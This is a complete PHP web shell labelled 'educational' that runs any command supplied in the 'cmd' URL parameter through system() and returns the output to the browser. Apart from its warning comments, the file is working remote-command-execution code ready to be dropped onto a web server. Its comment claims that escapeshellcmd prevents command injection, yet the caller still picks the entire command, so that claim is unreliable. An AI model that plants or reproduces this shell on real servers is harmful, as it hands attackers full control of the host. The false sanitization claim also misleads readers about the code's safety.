<?php
/**
 * Axiom's Educational Web Shell
 * 
 * This script demonstrates server-side command execution.
 * 
 * SECURITY WARNING:
 * This script is extremely dangerous if exposed to the public internet.
 * It allows execution of arbitrary system commands via the 'cmd' parameter.
 * 
 * ONLY use this on a local machine or a secure, isolated environment.
 * Do NOT deploy this to a production server without strict access controls.
 */

// Check if the command is set
if (isset($_GET['cmd'])) {
    
    // Sanitize the input to prevent command injection
    // This is a basic sanitization. In a real-world scenario, use a whitelist or a more robust method.
    $cmd = escapeshellcmd($_GET['cmd']);
    
    // Get the output of the command
    // system() executes the command and outputs the result directly to the browser
    // We add 2>&1 to redirect standard error to standard output so we see errors
    system("$cmd 2>&1");
    
} else {
    // If no command is provided, display a default message
    echo "Axiom's Web Shell v1.0";
    echo "<br>";
    echo "Usage: ?cmd=[your_command]";
}
?>
